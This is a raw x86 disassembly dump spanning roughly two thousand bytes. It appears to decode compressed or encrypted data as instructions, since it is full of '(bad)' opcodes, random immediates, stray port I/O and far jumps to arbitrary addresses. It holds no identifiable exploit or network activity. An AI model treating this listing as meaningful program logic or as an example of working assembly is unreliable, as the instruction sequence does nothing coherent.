  424579:	xor    BYTE PTR [edi-0x3b713427],bl
  42457f:	xchg   edx,eax
  424580:	jno    0x424542
  424582:	jno    0x424559
  424584:	jo     0x4245e8
  424586:	ror    DWORD PTR [ebp-0x4b9096f6],cl
  42458c:	fs cld 
  42458e:	mov    ah,0x80
  424590:	xchg   ebp,eax
  424591:	jo     0x424538
  424593:	(bad)  
  424594:	sbb    al,0xc7
  424596:	pop    eax
  424597:	loop   0x42459e
  424599:	dec    ecx
  42459a:	(bad)  
  42459b:	jno    0x42461c
  42459d:	in     al,0xac
  42459f:	jnp    0x424610
  4245a1:	mov    ebp,0xd240fb3a
  4245a6:	test   eax,0x714ddb95
  4245ab:	test   eax,0x825a34a2
	...
  4245b8:	add    BYTE PTR [eax],al
  4245ba:	push   cs
  4245bb:	and    BYTE PTR [eax-0x404051c1],cl
  4245c1:	xor    edi,edx
  4245c3:	sub    dh,BYTE PTR [eax+0x2a2b85b7]
  4245c9:	into   
  4245ca:	int3   
  4245cb:	mov    esi,0x1fe0001
  4245d0:	add    BYTE PTR [eax],al
  4245d2:	xor    bh,BYTE PTR [ebx+0x1a]
  4245d5:	adc    al,0x65
  4245d7:	call   DWORD PTR [ebx+ebp*4]
  4245da:	dec    esp
  4245db:	or     edx,DWORD PTR [ebp+0x18]
  4245de:	fbld   TBYTE PTR [edx+0x50]
  4245e1:	sti    
  4245e2:	xchg   BYTE PTR [ebx-0x50],ch
  4245e5:	jmp    DWORD PTR [eax]
  4245e7:	mov    ebx,0x11e2e42c
  4245ec:	push   esp
  4245ed:	xlat   BYTE PTR ds:[ebx]
  4245ee:	dec    ebx
  4245ef:	adc    esi,DWORD PTR [ebx+ecx*8+0x2b]
  4245f3:	ror    edx,0x81
  4245f6:	mov    bl,0x11
  4245f8:	and    DWORD PTR [ecx],edi
  4245fa:	retf   0x5c0c
  4245fd:	mov    esp,0xbd0ad518
  424602:	xchg   DWORD PTR [esi-0x1e4eb3b9],ebx
  424608:	arpl   WORD PTR [ebx-0x642e3f1],cx
  42460e:	mov    eax,0x7550e419
  424613:	lahf   
  424614:	inc    ecx
  424615:	sbb    al,0xcc
  424617:	fs push ss
  424619:	pop    ebp
  42461a:	jmp    0x36646309
  42461f:	neg    DWORD PTR [edx]
  424621:	shl    bh,cl
  424623:	push   0xbb180cf6
  424628:	in     eax,dx
  424629:	mov    bh,0xba
  42462b:	sbb    eax,DWORD PTR [esi+0x2bdff61c]
  424631:	cli    
  424632:	sbb    al,0xb6
  424634:	sbb    BYTE PTR [eax-0x5127636c],dh
  42463a:	test   al,0xef
  42463c:	mov    esp,0x2c130d57
  424641:	sti    
  424642:	mov    edi,0x9a2c018d
  424647:	jae    0x4245cd
  424649:	clc    
  42464a:	mov    edi,0xe3e428e8
  42464f:	jp     0x424619
  424651:	lods   eax,DWORD PTR ds:[esi]
  424652:	popa   
  424653:	das    
  424654:	rol    BYTE PTR [ebx-0x32],cl
  424657:	inc    edi
  424658:	rcr    BYTE PTR [esi+0x5e],0xdf
  42465c:	sbb    BYTE PTR [edi+edi*8+0xe714155],cl
  424663:	repnz in eax,dx
  424665:	xchg   esi,eax
  424666:	sub    eax,esp
  424668:	jbe    0x4246c5
  42466a:	out    0xa4,eax
  42466c:	mov    esi,0x102be8a1
  424671:	ror    DWORD PTR [edi],0x5
  424674:	test   DWORD PTR [edx],ebx
  424676:	push   edx
  424677:	iret   
  424678:	fmul   st(2),st
  42467a:	pop    ecx
  42467b:	js     0x42469e
  42467d:	xor    ebp,edi
  42467f:	mov    ds:0xd39f8c64,eax
  424684:	shr    cl,1
  424686:	xor    edx,DWORD PTR [edi-0x16]
  424689:	push   eax
  42468a:	xchg   ebp,eax
  42468b:	sti    
  42468c:	clc    
  42468d:	cli    
  42468e:	push   ds
  42468f:	adc    al,0xe4
  424691:	mov    edi,0xf858ab43
  424696:	faddp  st(3),st
  424698:	(bad)  
  424699:	test   esp,0xdd949233
  42469f:	rcr    DWORD PTR [eax-0x500bc0ae],0x82
  4246a6:	xchg   ecx,eax
  4246a7:	jecxz  0x4246db
  4246a9:	mov    eax,0x7d0307d
  4246ae:	xor    DWORD PTR [edx-0x2bc5dbe6],ecx
  4246b4:	mov    ecx,es
  4246b6:	sbb    eax,0x7c8a5bc1
  4246bb:	adc    DWORD PTR es:[esi],edi
  4246be:	adc    BYTE PTR [esi-0x76],ah
  4246c1:	and    esp,DWORD PTR [esi]
  4246c3:	psubsb mm4,QWORD PTR [edi+esi*2+0x660d6c02]
  4246cb:	lea    esp,[esp+ebx*8+0x1d45f4bb]
  4246d2:	aad    0x16
  4246d4:	add    eax,0xed0d88e3
  4246d9:	sub    BYTE PTR [eax-0x42d23f64],dh
  4246df:	test   BYTE PTR [eax],0xc1
  4246e2:	cld    
  4246e3:	mov    dh,0x78
  4246e5:	outs   dx,BYTE PTR ds:[esi]
  4246e6:	xor    DWORD PTR [edx-0x35],edx
  4246e9:	dec    edx
  4246ea:	outs   dx,DWORD PTR ds:[esi]
  4246eb:	jb     0x424677
  4246ed:	cmp    al,0x3a
  4246ef:	add    ebp,DWORD PTR [edi-0x56]
  4246f2:	and    BYTE PTR [ecx],ch
  4246f4:	jnp    0x4246e9
  4246f6:	in     eax,dx
  4246f7:	cli    
  4246f8:	popa   
  4246f9:	pushw  0x3c
  4246fc:	icebp  
  4246fd:	test   eax,0x28e7f621
  424702:	ja     0x4246ad
  424704:	xor    ax,0xe32a
  424708:	dec    eax
  424709:	mov    WORD PTR ds:0xe806981c,fs
  42470f:	mov    cl,0x3d
  424711:	mov    dl,0xc6
  424713:	jl     0x4246ad
  424715:	popa   
  424716:	push   ebx
  424717:	gs add eax,0x1b450993
  42471d:	inc    edi
  42471e:	jecxz  0x424798
  424720:	sbb    BYTE PTR [edi],bh
  424722:	(bad)  
  424723:	fsubr  QWORD PTR [ebx]
  424725:	inc    ebp
  424726:	or     DWORD PTR [edx-0x7a],0x3a63f41a
  42472d:	xor    edx,DWORD PTR [edi]
  42472f:	jge    0x424794
  424731:	sahf   
  424732:	in     eax,dx
  424733:	mov    ebp,0x2457d1e5
  424738:	mov    dh,0xc5
  42473a:	jg     0x424738
  42473c:	jecxz  0x4246e7
  42473e:	ret    0xc499
  424741:	inc    edi
  424742:	sub    DWORD PTR [ebx-0x40da9254],0xffffff8b
  424749:	in     eax,dx
  42474a:	push   ecx
  42474b:	mov    ebx,0xdcb4cdac
  424750:	sub    ah,BYTE PTR [eax]
  424752:	shr    DWORD PTR [ecx],1
  424754:	leave  
  424755:	xor    esp,DWORD PTR [esi-0x2c]
  424758:	push   DWORD PTR [esi]
  42475a:	cmp    BYTE PTR [esi+0x13],ah
  42475d:	sub    al,0xdf
  42475f:	xchg   esi,eax
  424760:	sbb    al,0x4e
  424762:	sbb    eax,0x7829f9db
  424767:	test   eax,0xb8015169
  42476c:	pop    ebp
  42476d:	retf   0x6e20
  424770:	ret    
  424771:	nop
  424772:	shr    BYTE PTR [ebp+0x74],0x1d
  424776:	cld    
  424777:	push   ebx
  424778:	and    edi,ecx
  42477a:	retf   0x35b0
  42477d:	test   al,0x78
  42477f:	xlat   BYTE PTR ds:[ebx]
  424780:	dec    ebx
  424781:	fcmovb st,st(0)
  424783:	ins    DWORD PTR es:[edi],dx
  424784:	fnstcw WORD PTR [ecx]
  424786:	jae    0x42472e
  424788:	cs js  0x424798
  42478b:	sbb    edx,DWORD PTR [esi]
  42478d:	and    edx,DWORD PTR [ebx+0x7a]
  424790:	mov    esi,0xa602e5e6
  424795:	push   edi
  424796:	or     BYTE PTR [esi],dh
  424798:	loope  0x42477d
  42479a:	or     DWORD PTR [ebx],esi
  42479c:	mov    ebx,0xd3ce5cdf
  4247a1:	mov    ds:0xcfcbb38f,al
  4247a6:	mov    bl,0xb8
  4247a8:	jp     0x42478c
  4247aa:	imul   edi,DWORD PTR ds:0x1485fad1,0xe5c57ff1
  4247b4:	mov    esp,DWORD PTR [ebx-0x3d7b4925]
  4247ba:	add    dh,BYTE PTR [ecx]
  4247bc:	popf   
  4247bd:	sbb    ch,BYTE PTR ss:[edi]
  4247c0:	and    dh,bl
  4247c2:	cmp    eax,0x9ff22ae0
  4247c7:	and    dh,BYTE PTR [ebx-0x64923c30]
  4247cd:	jmp    0x424791
  4247cf:	rol    DWORD PTR [eax],cl
	...
  4247d9:	add    BYTE PTR [edi+edi*4+0x63],bl
  4247dd:	push   eax
  4247de:	jecxz  0x4247bc
  4247e0:	jg     0x4247a1
  4247e2:	data16 adc al,0x63
  4247e5:	sbb    al,0xe7
  4247e7:	test   BYTE PTR [edx],0x6e
  4247ea:	retf   0x1c0
  4247ed:	add    dh,bh
  4247ef:	add    DWORD PTR [eax],eax
  4247f1:	add    BYTE PTR [edx+0x4c6b4115],al
  4247f7:	test   BYTE PTR [edx+0x1a7fc7d6],dl
  4247fd:	mov    dh,0x7f
  4247ff:	jbe    0x424864
  424801:	in     eax,dx
  424802:	fwait
  424803:	icebp  
  424804:	(bad)  
  424805:	cwde   
  424806:	fstp   QWORD PTR [ebx+0xf94d895]
  42480c:	repz pusha 
  42480e:	scas   al,BYTE PTR es:[edi]
  42480f:	imul   ebp,DWORD PTR [ebx+0x6b],0x1a
  424813:	jne    0x42485d
  424815:	lods   eax,DWORD PTR ds:[esi]
  424816:	sbb    dl,bh
  424818:	xor    eax,0x54fd51fd
  42481d:	and    eax,0x53c8e102
  424822:	inc    eax
  424823:	ins    DWORD PTR es:[edi],dx
  424824:	push   ds
  424825:	das    
  424826:	sar    BYTE PTR [ebp-0x2dce4eb3],0x73
  42482d:	jp     0x42482f
  42482f:	sahf   
  424830:	mov    ebp,0x364995b
  424835:	xchg   ecx,eax
  424836:	mov    eax,DWORD PTR [ebx+0x62]
  424839:	out    dx,al
  42483a:	cmp    esp,DWORD PTR [edx]
  42483c:	lods   eax,DWORD PTR ds:[esi]
  42483d:	and    al,0x95
  42483f:	pusha  
  424840:	(bad)  
  424841:	mov    ds:0x54834223,eax
  424846:	xchg   edi,eax
  424847:	sbb    eax,0x5b2a48a1
  42484c:	ret    
  42484d:	cmp    al,0x49
  42484f:	jle    0x424871
  424851:	mov    BYTE PTR [ebx+eax*8],dl
  424854:	(bad)  
  424855:	mov    eax,0xbe2695a7
  42485a:	and    al,bh
  42485c:	add    al,0x5b
  42485e:	out    dx,al
  42485f:	jmp    0x6c39:0xc95d6722
  424866:	inc    ecx
  424867:	cmp    al,0x91
  424869:	xchg   ebx,eax
  42486a:	cmp    al,0xe0
  42486c:	stc    
  42486d:	cli    
  42486e:	mov    esp,0xd4cc8e6c
  424873:	rcr    BYTE PTR [ebp-0x20],0x95
  424877:	(bad)  
  424878:	iret   
  424879:	aas    
  42487a:	adc    edx,0x3d17ced6
  424880:	sti    
  424881:	xchg   ebp,eax
  424882:	jnp    0x4248fc
  424884:	push   cs
  424885:	mov    al,0x60
  424887:	dec    eax
  424888:	jo     0x4248e8
  42488a:	push   ebx
  42488b:	pushf  
  42488c:	add    esi,edi
  42488e:	mov    ds:0x484a146f,al
  424893:	lahf   
  424894:	imul   al
  424896:	adc    DWORD PTR gs:[edi-0x7d9c9e],ecx
  42489d:	(bad)  [ebx]
  42489f:	mov    edx,0x5a2e36a8
  4248a4:	push   ebx
  4248a5:	cs out 0x38,eax
  4248a8:	or     eax,0x4d491578
  4248ad:	cmp    BYTE PTR [esi+ecx*1-0x464f0d35],bl
  4248b4:	push   0x544c4ee
  4248b9:	mov    ch,0xe0
  4248bb:	or     ebx,ecx
  4248bd:	js     0x424872
  4248bf:	aaa    
  4248c0:	xchg   DWORD PTR [edx+0x51],ebp
  4248c3:	ins    BYTE PTR es:[edi],dx
  4248c4:	cmp    DWORD PTR [esi],ebp
  4248c6:	aad    0x2c
  4248c8:	and    ebp,DWORD PTR [edx]
  4248ca:	mov    edi,0x3d385169
  4248cf:	jno    0x424929
  4248d1:	dec    edx
  4248d2:	mov    DWORD PTR [ecx],esp
  4248d4:	sub    ebp,ecx
  4248d6:	mov    edi,0x10bd0878
  4248db:	or     edx,DWORD PTR [esp+eiz*2]
  4248de:	mov    al,0x31
  4248e0:	mov    edi,0x6e2ae967
  4248e5:	es pop eax
  4248e7:	adc    al,0x66
  4248e9:	(bad)  
  4248ea:	cmp    eax,0x14001fa7
  4248ef:	push   ds
  4248f0:	retf   0xde70
  4248f3:	mov    ds:0x430e246b,al
  4248f8:	call   0xfe1fcb6b
  4248fd:	cs sub edx,eax
  424900:	xchg   esp,eax
  424901:	shl    DWORD PTR [ecx],cl
  424903:	std    
  424904:	jp     0x4248a9
  424906:	icebp  
  424907:	cdq    
  424908:	mov    es,ecx
  42490a:	add    al,0xbb
  42490c:	jnp    0x4248a2
  42490e:	jo     0x424952
  424910:	adc    al,BYTE PTR [ebx+eax*4+0x3a]
  424914:	pop    esp
  424915:	(bad)  
  424917:	vmovhpd QWORD PTR [ecx+eax*2+0x5eeb1958],xmm6
  424920:	inc    eax
  424921:	popf   
  424922:	jae    0x424940
  424924:	stc    
  424925:	mov    dl,0x94
  424927:	xor    eax,0x9496c48c
  42492c:	xchg   BYTE PTR [edi+0x73],ah
  42492f:	out    dx,eax
  424930:	and    edx,0x71abf08c
  424936:	das    
  424937:	inc    edx
  424938:	mov    ecx,0xf0b14ca8
  42493d:	retf   
  42493e:	imul   edx,DWORD PTR [eax+0x44],0x50b2f28b
  424945:	mov    cl,0xf8
  424947:	pop    eax
  424948:	mov    ebp,0xcc3b969a
  42494d:	test   eax,0x179c8293
  424952:	cs xor ch,dh
  424955:	cmp    BYTE PTR [ebx-0x2339c1a1],bh
  42495b:	push   edi
  42495c:	in     eax,dx
  42495d:	jno    0x424946
  42495f:	jnp    0x42498b
  424961:	push   eax
  424962:	fidiv  WORD PTR [esi+edx*4]
  424965:	add    dh,BYTE PTR [esi+0x33]
  424968:	sbb    eax,0x30e65d0a
  42496d:	xor    al,0xf1
  42496f:	lahf   
  424970:	xchg   edx,eax
  424971:	adc    eax,DWORD PTR [edx+0x1204fc37]
  424977:	xchg   esi,eax
  424978:	hlt    
  424979:	xchg   edx,eax
  42497a:	pop    edx
  42497b:	nop
  42497c:	lahf   
  42497d:	mov    dh,0xf1
  42497f:	lods   eax,DWORD PTR ds:[esi]
  424980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424981:	push   ecx
  424982:	pop    ecx
  424983:	loop   0x4249e2
  424985:	pusha  
  424986:	(bad)  
  424987:	jecxz  0x424983
  424989:	mov    ds:0x1257c29,eax
  42498e:	test   cl,al
  424990:	mov    BYTE PTR [ebx+eax*8],bl
  424993:	xor    al,0x56
  424995:	shr    BYTE PTR [ecx+edx*4],1
  424998:	xlat   BYTE PTR ds:[ebx]
  424999:	push   ebp
  42499a:	or     al,0xf9
  42499c:	jb     0x424974
  42499e:	mov    dl,0x8
  4249a0:	or     ah,dh
  4249a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249a3:	xchg   edx,eax
  4249a4:	sahf   
  4249a5:	jmp    0xcfc3:0xd1722e38
  4249ac:	rol    BYTE PTR [esi+0x28],1
  4249af:	je     0x4249d0
  4249b1:	xor    ch,dl
  4249b3:	and    edx,ebx
  4249b5:	jae    0x424a13
  4249b7:	fst    st(5)
  4249b9:	mov    bh,BYTE PTR [edi+ebx*1-0x63418cf1]
  4249c0:	fisttp QWORD PTR [eax+0x1b]
  4249c3:	sbb    cl,ch
  4249c5:	sub    ebx,ecx
  4249c7:	mov    ch,0x61
  4249c9:	lods   al,BYTE PTR fs:[esi]
  4249cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249cc:	stos   BYTE PTR es:[edi],al
  4249cd:	sbb    BYTE PTR [eax],ah
  4249cf:	jmp    0x2f71369e
  4249d4:	jge    0x424a4b
  4249d6:	pop    ecx
  4249d7:	mov    edx,0x4950c452
  4249dc:	cli    
  4249dd:	inc    esi
  4249de:	push   edx
  4249df:	xchg   ecx,eax
  4249e0:	push   ebx
  4249e2:	imul   eax,edx,0x501e1e08
  4249e8:	sbb    cl,BYTE PTR [ebx-0x20]
  4249eb:	cs in  al,0x1
  4249ee:	loop   0x424a66
	...
  4249f8:	add    BYTE PTR [eax],al
  4249fa:	inc    ebx
  4249fb:	push   ebp
  4249fc:	pusha  
  4249fd:	(bad)  
  4249fe:	jbe    0x4249bf
  424a00:	out    dx,eax
  424a01:	(bad)  
  424a03:	test   al,0x37
  424a05:	stos   DWORD PTR es:[edi],eax
  424a06:	inc    ebx
  424a07:	test   BYTE PTR [ebx],bh
  424a09:	jmp    0x440cd6
  424a0e:	inc    BYTE PTR [ecx]
  424a10:	add    BYTE PTR [eax],al
  424a12:	into   
  424a13:	mov    esi,eax
  424a15:	out    0x2e,al
  424a17:	jns    0x424a05
  424a19:	jae    0x424a5d
  424a1b:	cli    
  424a1c:	push   edi
  424a1d:	xor    ch,dl
  424a1f:	in     al,0xe1
  424a21:	push   0xe8204769
  424a26:	imul   ebp,eax,0x20
  424a29:	sbb    dh,bl
  424a2b:	js     0x424a59
  424a2d:	pop    ecx
  424a2e:	jmp    0x424a74
  424a30:	je     0x424a4c
  424a32:	sub    ch,BYTE PTR [edx+ebx*4]
  424a35:	mov    ch,0x98
  424a37:	dec    esi
  424a38:	lods   al,BYTE PTR ds:[esi]
  424a39:	je     0x424aa0
  424a3b:	arpl   WORD PTR [edx+ebx*1-0x50],bp
  424a3f:	(bad)  
  424a40:	js     0x424a99
  424a42:	aas    
  424a43:	push   es
  424a44:	(bad)  
  424a45:	and    esp,DWORD PTR [eax]
  424a47:	arpl   WORD PTR ds:0xbc71c14a,bx
  424a4d:	or     dh,BYTE PTR [esi-0xd]
  424a50:	and    edi,DWORD PTR [esi]
  424a52:	fist   DWORD PTR [ecx-0x2cd30952]
  424a58:	aam    0x88
  424a5a:	sbb    eax,DWORD PTR [edx]
  424a5c:	add    edi,DWORD PTR [esi-0x26]
  424a5f:	or     esi,DWORD PTR [edi]
  424a61:	call   0x30f34ac5
  424a66:	in     al,dx
  424a67:	xchg   ebx,eax
  424a68:	pop    ss
  424a69:	stos   BYTE PTR es:[edi],al
  424a6a:	mov    ecx,0xd49f75aa
  424a6f:	pop    es
  424a70:	sbb    ah,ch
  424a72:	outs   dx,BYTE PTR ds:[esi]
  424a73:	ror    eax,0x8
  424a76:	sub    dl,BYTE PTR [esi+0x5b]
  424a79:	push   eax
  424a7a:	or     DWORD PTR [edi],ecx
  424a7c:	aad    0xeb
  424a7e:	gs xchg esi,eax
  424a80:	js     0x424aa9
  424a82:	out    dx,eax
  424a83:	cdq    
  424a84:	dec    ah
  424a86:	pushf  
  424a87:	or     ah,cl
  424a89:	imul   esi,DWORD PTR [esi-0x61ee9f12],0x72
  424a90:	aam    0xa6
  424a92:	cmp    BYTE PTR [edx+0x7d],0xfe
  424a96:	imul   ebx,ebx,0x44f48c56
  424a9c:	pmuludq mm6,QWORD PTR [ecx+0x28]
  424aa0:	pushf  
  424aa1:	hlt    
  424aa2:	push   ss
  424aa3:	cmp    DWORD PTR [ebx-0xda5dda4],edx
  424aa9:	(bad)  
  424aaa:	xor    edi,edi
  424aac:	fimul  WORD PTR [ebx]
  424aae:	jp     0x424a91
  424ab0:	mov    ds:0x92f6604a,eax
  424ab5:	outs   dx,DWORD PTR ds:[esi]
  424ab6:	sti    
  424ab7:	(bad)  
  424ab8:	xor    DWORD PTR [ecx+0x29842b33],eax
  424abe:	(bad)  
  424abf:	fdivrp st(6),st
  424ac1:	mov    dh,0xd5
  424ac3:	mov    ah,0x21
  424ac5:	cmp    eax,0x9307e192
  424aca:	add    eax,0xbbdbb10f
  424acf:	cmp    DWORD PTR [ecx],0xffffffce
  424ad2:	xor    eax,0x4e58210
  424ad7:	add    DWORD PTR [ebx+0x63313e0b],0x5744feda
  424ae1:	inc    edi
  424ae2:	arpl   WORD PTR [edi-0x55],si
  424ae5:	iret   
  424ae6:	imul   BYTE PTR [esi+0x2]
  424ae9:	cdq    
  424aea:	pop    ebp
  424aeb:	test   DWORD PTR [edx+eiz*8+0x21f6e254],ebx
  424af2:	clc    
  424af3:	inc    edx
  424af4:	push   esp
  424af5:	arpl   WORD PTR [ecx+0x34],cx
  424af8:	dec    ecx
  424af9:	imul   ebx,DWORD PTR [eax+ecx*4+0x41],0x62172584
  424b01:	stos   BYTE PTR es:[edi],al
  424b02:	xchg   ebp,eax
  424b03:	hlt    
  424b04:	sti    
  424b05:	test   eax,0x7de9ba0f
  424b0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b0b:	or     DWORD PTR [eax],edx
  424b0d:	in     al,dx
  424b0e:	sbb    BYTE PTR [edi-0x30],cl
  424b11:	push   eax
  424b12:	push   edx
  424b13:	jl     0x424ad0
  424b15:	and    BYTE PTR [ebx],dl
  424b17:	loop   0x424ab2
  424b19:	test   al,0xd9
  424b1b:	mov    bh,BYTE PTR [esi]
  424b1d:	into   
  424b1e:	(bad)  
  424b1f:	xchg   edi,eax
  424b20:	inc    ebx
  424b21:	cmp    DWORD PTR [edx-0x37],eax
  424b24:	stos   DWORD PTR es:[edi],eax
  424b25:	sbb    esp,DWORD PTR [edi+0xc045930]
  424b2b:	and    bh,BYTE PTR [eax-0x495d0473]
  424b31:	push   esp
  424b32:	mov    WORD PTR [edx-0x9],ds
  424b35:	pop    ebp
  424b36:	loope  0x424ac1
  424b38:	xlat   BYTE PTR ds:[ebx]
  424b39:	or     BYTE PTR [ebx-0x70d274c6],0xa
  424b40:	into   
  424b41:	jno    0x424b2f
  424b43:	jmp    0x8146:0xb470ad36
  424b4a:	mov    ds:0xd16c3aaf,eax
  424b4f:	cdq    
  424b50:	jmp    0x424ba3
  424b52:	pop    ecx
  424b53:	fidiv  WORD PTR [eax-0x762cb164]
  424b59:	cmc    
  424b5a:	pop    ds
  424b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b5c:	xchg   esi,eax
  424b5d:	mov    cl,0x9f
  424b5f:	shl    ch,1
  424b61:	jno    0x424b9a
  424b63:	hlt    
  424b64:	repnz imul esp
  424b67:	mov    esp,0x580bda0e
  424b6c:	jl     0x424b8c
  424b6e:	jmp    0x424bcb
  424b70:	cli    
  424b71:	mov    dh,0x5d
  424b73:	fld    QWORD PTR [ebp-0xa]
  424b76:	(bad)  
  424b77:	cmp    ch,ch
  424b79:	pop    edx
  424b7a:	sahf   
  424b7b:	in     al,dx
  424b7c:	jns    0x424be0
  424b7e:	aad    0x91
  424b80:	pop    ecx
  424b81:	sbb    BYTE PTR [edi-0xa9d9b64],dl
  424b87:	fcom   QWORD PTR [ecx-0x73]
  424b8a:	out    dx,eax
  424b8b:	jb     0x424bb1
  424b8d:	std    
  424b8e:	or     BYTE PTR [ecx],cl
  424b90:	in     eax,0xf5
  424b92:	pop    ds
  424b93:	pusha  
  424b94:	mov    esi,0x54f5d21b
  424b99:	scas   eax,DWORD PTR es:[edi]
  424b9a:	dec    edx
  424b9b:	jbe    0x424bfa
  424b9d:	sbb    eax,0xea88b0f0
  424ba2:	mov    ds:0xbe9bb100,eax
  424ba7:	pop    es
  424ba8:	add    ah,cl
  424baa:	hlt    
  424bab:	paddusb mm3,mm0
  424bae:	test   al,0xd5
  424bb0:	rol    DWORD PTR [eax+0x1ac0e56],0xf7
  424bb7:	stos   DWORD PTR es:[edi],eax
  424bb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bb9:	xchg   esp,eax
  424bba:	mov    al,ds:0xfb44374b
  424bbf:	dec    edi
  424bc0:	pop    ds
  424bc1:	lods   al,BYTE PTR ds:[esi]
  424bc2:	mov    bl,0xd3
  424bc4:	mov    bh,0x78
  424bc6:	mov    tr2,esi
  424bc9:	mov    ecx,0xbc20d635
  424bce:	xchg   BYTE PTR [eax-0x6eb3ffbb],dl
  424bd4:	in     eax,0xc2
  424bd6:	je     0x424b6d
  424bd8:	(bad)  [ebx-0x10ab9fdd]
  424bde:	or     DWORD PTR [ebx],esp
  424be0:	retf   
  424be1:	sahf   
  424be2:	fbstp  TBYTE PTR [edi]
  424be4:	(bad)  
  424be5:	fldenv [edx-0x4eff01ca]
  424beb:	and    al,0x3a
  424bed:	stos   BYTE PTR es:[edi],al
  424bee:	adc    eax,0x31a47a50
  424bf3:	jnp    0x424c60
  424bf5:	pusha  
  424bf6:	and    ebx,DWORD PTR [esi-0x28fae9c4]
  424bfc:	nop
  424bfd:	xchg   DWORD PTR [ebp+eax*4+0x17],eax
  424c01:	pop    ds
  424c02:	xor    DWORD PTR [ecx+0x598ed097],eax
  424c08:	arpl   ax,di
  424c0a:	mov    ebx,0x8bce2501
  424c0f:	xor    eax,DWORD PTR [eax]
	...
  424c19:	add    BYTE PTR [edi+0x2d],dl
  424c1c:	pop    es
  424c1d:	call   0xe967:0xeddfba7f
  424c24:	addr16 xor al,0x60
  424c27:	retf   0xc60b
  424c2a:	mov    ah,0x1
  424c2d:	add    dh,bh
  424c2f:	add    DWORD PTR [eax],eax
  424c31:	add    BYTE PTR ds:0x62659a4f,dl
  424c37:	jge    0x424bfc
  424c39:	pop    es
  424c3a:	adc    al,0xde
  424c3c:	or     edx,ecx
  424c3e:	mov    dl,0x50
  424c40:	std    
  424c41:	push   edi
  424c42:	cvtdq2ps xmm7,XMMWORD PTR [ebp+0x62839e5d]
  424c49:	shl    BYTE PTR [edi-0x5c],cl
  424c4c:	cmp    al,0x7
  424c4e:	sbb    BYTE PTR [esi-0x35f4ceb3],ah
  424c54:	in     eax,dx
  424c55:	pop    es
  424c56:	mov    BYTE PTR [edi-0x2ade8014],bh
  424c5c:	pushf  
  424c5d:	push   ecx
  424c5e:	mov    esi,0xf2b5066d
  424c63:	push   esi
  424c64:	cs iret 
  424c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c67:	mov    ah,0x3d
  424c69:	push   esi
  424c6a:	dec    esi
  424c6b:	out    0x91,al
  424c6d:	xchg   esi,eax
  424c6e:	leave  
  424c6f:	and    al,0xef
  424c71:	das    
  424c72:	test   DWORD PTR [eax],ecx
  424c74:	mov    gs,eax
  424c76:	push   ebp
  424c77:	call   0xb609f8dd
  424c7c:	pop    ss
  424c7d:	inc    esp
  424c7e:	(bad)  
  424c7f:	ins    BYTE PTR es:[edi],dx
  424c80:	mov    ecx,DWORD PTR [edx+eiz*2-0x76]
  424c84:	xor    dl,BYTE PTR [edi+0x7b]
  424c87:	les    esp,FWORD PTR [edi-0x2d]
  424c8a:	sub    eax,0xe74df67e
  424c8f:	cdq    
  424c90:	repz jne 0x424c3d
  424c93:	setae  BYTE PTR [ebp-0xeec171]
  424c9a:	lock xor BYTE PTR [ecx-0x7b],dl
  424c9e:	js     0x424c3f
  424ca0:	jl     0x424cfb
  424ca2:	mov    eax,0x18073be4
  424ca7:	or     DWORD PTR [edx-0x6a],ebx
  424caa:	(bad)
  424cae:	int    0x82
  424cb0:	out    dx,al
  424cb1:	push   eax
  424cb2:	in     eax,0x85
  424cb4:	mov    ecx,0x53bd094f
  424cb9:	cmp    DWORD PTR [ecx-0x58b771c3],esp
  424cbf:	scas   eax,DWORD PTR es:[edi]
  424cc0:	mov    edi,0x6c6e1ea4
  424cc5:	loope  0x424d08
  424cc7:	pop    ecx
  424cc8:	test   al,0x81
  424cca:	xchg   ecx,eax
  424ccb:	arpl   sp,cx
  424ccd:	add    ah,bl
  424ccf:	lahf   
  424cd0:	call   0x82f5:0x3bbe4fcb
  424cd7:	out    dx,al
  424cd8:	inc    ecx
  424cd9:	jns    0x424c5d
  424cdb:	mov    ebx,0x45fe5a
  424ce0:	jae    0x424ce4
  424ce2:	test   al,0xf2
  424ce4:	and    ah,BYTE PTR [esi]
  424ce6:	lods   al,BYTE PTR ds:[esi]
  424ce7:	rcr    BYTE PTR [esi+0x674c86c],cl
  424ced:	retf   0xa05e
  424cf0:	or     edx,DWORD PTR [eax-0x53]
  424cf3:	imul   edx,DWORD PTR [edx+0xe],0xffffffa7
  424cf7:	push   esp
  424cf8:	xlat   BYTE PTR ds:[ebx]
  424cf9:	sbb    ebx,DWORD PTR [edx-0x2323d3a8]
  424cff:	mov    ch,0x28
  424d01:	shr    ebp,cl
  424d03:	fcmovu st,st(5)
  424d05:	pop    esp
  424d06:	aam    0x98
  424d08:	je     0x424cb0
  424d0a:	mov    ecx,0x44258c58
  424d0f:	xor    eax,DWORD PTR [ebp-0x1206f1d6]
  424d15:	iret   
  424d16:	push   cs
  424d17:	cmp    dl,dh
  424d19:	and    dl,BYTE PTR [eax]
  424d1b:	dec    eax
  424d1c:	stos   BYTE PTR es:[edi],al
  424d1d:	cmc    
  424d1e:	jge    0x424cda
  424d20:	sbb    eax,DWORD PTR ds:0x9498b050
  424d26:	xchg   BYTE PTR [edi],bh
  424d28:	or     BYTE PTR [ecx],dl
  424d2a:	mov    ah,0x68
  424d2c:	int3   
  424d2d:	push   es
  424d2e:	rcr    BYTE PTR [esi-0x43eeedf2],1
  424d34:	xchg   esi,eax
  424d35:	xchg   edi,eax
  424d36:	loopne 0x424cdc
  424d38:	cmp    al,0x3b
  424d3a:	mov    ds:0x9d7de469,al
  424d3f:	pop    esi
  424d40:	or     DWORD PTR [ebx],edi
  424d42:	cmp    DWORD PTR [ebp+0x28],ecx
  424d45:	cs (bad) 
  424d47:	out    0xc4,al
  424d49:	idiv   BYTE PTR ds:0xd7e796f2
  424d4f:	push   edx
  424d50:	pop    esi
  424d51:	ja     0x424d5a
  424d53:	fwait
  424d54:	cdq    
  424d55:	fidivr WORD PTR [eax+0x1e]
  424d58:	sbb    eax,0xb3f3ada2
  424d5d:	int3   
  424d5e:	inc    esp
  424d5f:	es pop ss
  424d61:	adc    DWORD PTR [ebx-0xd],esi
